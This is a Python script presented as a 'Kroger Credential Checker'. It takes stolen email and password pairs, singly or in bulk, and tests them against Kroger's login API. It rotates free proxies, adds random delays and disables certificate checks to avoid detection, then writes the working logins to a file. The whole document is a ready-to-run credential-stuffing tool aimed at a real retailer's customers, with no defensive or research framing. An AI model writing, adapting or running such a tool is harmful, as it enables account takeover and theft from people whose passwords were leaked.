import requests
import json
import logging
import random
import time
from typing import List, Dict
import urllib3
from fp.fp import FreeProxy
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configure verbose logging
logging.basicConfig(
    level=logging.DEBUG,  # Changed to DEBUG for verbose output
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('kroger_checker_verbose.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class KrogerChecker:
    def __init__(self, use_proxy: bool = True):
        logger.debug("Initializing KrogerChecker instance")
        self.use_proxy = use_proxy
        self.proxy = None
        self.session = requests.Session()
        self.session.verify = False
        self.valid_creds = []
        self.invalid_creds = []
        
        if self.use_proxy:
            logger.debug("Proxy usage enabled, initializing proxy")
            self._rotate_proxy()
        else:
            logger.debug("Proxy usage disabled")
            
    def _rotate_proxy(self):
        """Get and test a working proxy with verbose logging"""
        max_retries = 3
        logger.debug(f"Starting proxy rotation (max {max_retries} attempts)")
        
        for attempt in range(1, max_retries + 1):
            try:
                logger.debug(f"Attempt {attempt}: Getting new proxy")
                self.proxy = FreeProxy(rand=True, timeout=5).get()
                
                if not self.proxy:
                    logger.debug("Received empty proxy, retrying...")
                    continue
                    
                logger.debug(f"Testing proxy: {self.proxy}")
                self.session.proxies = {
                    'http': self.proxy,
                    'https': self.proxy
                }
                
                # Test proxy connection with verbose logging
                try:
                    logger.debug("Sending test request to Kroger.com")
                    test_resp = self.session.get(
                        'https://www.kroger.com', 
                        timeout=10,
                        headers={'User-Agent': 'Mozilla/5.0'}
                    )
                    logger.debug(f"Test response status: {test_resp.status_code}")
                    
                    if test_resp.status_code == 200:
                        logger.info(f"Proxy connection established: {self.proxy}")
                        return True
                        
                    logger.warning(f"Proxy test failed (status {test_resp.status_code})")
                except Exception as e:
                    logger.warning(f"Proxy test failed: {str(e)}")
                    logger.debug("Response headers: %s", test_resp.headers if 'test_resp' in locals() else "N/A")
                    
            except Exception as e:
                logger.warning(f"Proxy rotation failed: {str(e)}")
                logger.debug("Full error details:", exc_info=True)
        
        logger.warning("No working proxy found after %d attempts", max_retries)
        self.proxy = None
        self.session.proxies = {}
        return False
            
    def _check_credentials(self, email: str, password: str) -> bool:
        """Direct API validation with verbose logging"""
        logger.debug("Starting credential validation")
        logger.debug("Target URL: https://www.kroger.com/auth/api/login")
        
        try:
            logger.debug("Preparing login request payload")
            payload = {
                'email': email,
                'password': password
            }
            
            headers = {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0',
                'X-Requested-With': 'XMLHttpRequest'
            }
            
            logger.debug("Sending login request")
            response = self.session.post(
                'https://www.kroger.com/auth/api/login',
                json=payload,
                headers=headers,
                timeout=15
            )
            
            logger.debug(f"Received response status: {response.status_code}")
            logger.debug(f"Response headers: {response.headers}")
            logger.debug(f"Response content (first 200 chars): {response.text[:200]}")
            
            if response.status_code == 200:
                try:
                    logger.debug("Attempting to parse JSON response")
                    response_data = response.json()
                    logger.debug(f"Full response data: {response_data}")
                    return 'token' in response_data
                except Exception as e:
                    logger.error(f"JSON parsing failed: {str(e)}")
                    logger.debug(f"Raw response: {response.text}")
                    return False
                    
            logger.warning(f"Login failed with status {response.status_code}")
            return False
            
        except Exception as e:
            logger.error(f"Validation error: {str(e)}", exc_info=True)
            return False
            
    def check_single(self, email: str, password: str):
        """Check a single credential pair with verbose logging"""
        logger.info(f"Starting single credential check for: {email}")
        is_valid = self._check_credentials(email, password)
        
        result = {
            'email': email,
            'password': password,
            'valid': is_valid,
            'proxy': self.proxy
        }
        
        if is_valid:
            logger.info(f"VALID CREDENTIALS: {email}")
            self.valid_creds.append(result)
        else:
            logger.info(f"INVALID CREDENTIALS: {email}")
            self.invalid_creds.append(result)
            
        logger.debug(f"Result: {result}")
        return result
        
    def check_bulk(self, credentials: List[Dict[str, str]]):
        """Check multiple credentials with verbose logging"""
        logger.info(f"Starting bulk check of {len(credentials)} credentials")
        results = []
        
        for i, cred in enumerate(credentials, 1):
            logger.debug(f"Processing credential {i}/{len(credentials)}")
            result = self.check_single(cred['email'], cred['password'])
            results.append(result)
            
            if self.use_proxy and random.random() > 0.7:
                logger.debug("Rotating proxy...")
                self._rotate_proxy()
                
            delay = random.uniform(1, 3)
            logger.debug(f"Sleeping for {delay:.2f} seconds")
            time.sleep(delay)
            
        return results
        
    def save_results(self):
        """Save results with verbose logging"""
        logger.info("Saving results to JSON files")
        
        with open('valid_credentials.json', 'w') as f:
            json.dump(self.valid_creds, f, indent=2)
            logger.debug(f"Saved {len(self.valid_creds)} valid credentials")
            
        with open('invalid_credentials.json', 'w') as f:
            json.dump(self.invalid_creds, f, indent=2)
            logger.debug(f"Saved {len(self.invalid_creds)} invalid credentials")
            
        logger.info("Results saved successfully")
        
    def close(self):
        """Clean up resources with logging"""
        logger.debug("Closing session and cleaning up resources")
        self.session.close()
        logger.info("Checker session closed")

def main():
    print("Kroger Credential Checker (Verbose Version)")
    print("==========================================")
    
    proxy_choice = input("Use proxies? (y/n): ").lower()
    use_proxy = proxy_choice == 'y'
    logger.info(f"Proxy usage: {'Enabled' if use_proxy else 'Disabled'}")
    
    print("\nOperation Modes:")
    print("1. Check single credential")
    print("2. Check bulk credentials from file")
    choice = input("Select option (1/2): ")
    logger.info(f"Selected mode: {'Single' if choice == '1' else 'Bulk'} check")
    
    checker = KrogerChecker(use_proxy=use_proxy)
    
    try:
        if choice == '1':
            email = input("Email: ")
            password = input("Password: ")
            logger.debug(f"Received credentials for: {email}")
            
            result = checker.check_single(email, password)
            print("\nResult:")
            print(json.dumps(result, indent=2))
            
        elif choice == '2':
            file_path = input("Enter credentials file path (JSON format): ")
            logger.debug(f"Attempting to load file: {file_path}")
            
            try:
                with open(file_path) as f:
                    credentials = json.load(f)
                    
                logger.info(f"Found {len(credentials)} credentials to check")
                print(f"\nChecking {len(credentials)} credentials...")
                
                results = checker.check_bulk(credentials)
                
                print("\nSummary:")
                print(f"Valid: {len(checker.valid_creds)}")
                print(f"Invalid: {len(checker.invalid_creds)}")
                
                checker.save_results()
                
            except Exception as e:
                logger.error(f"File error: {str(e)}", exc_info=True)
                print(f"Error: {str(e)}")
                
        else:
            logger.warning("Invalid menu selection")
            print("Invalid choice")
            
    finally:
        checker.close()

if __name__ == '__main__':
    logger.info("Starting Kroger Credential Checker")
    main()
    logger.info("Checker execution completed")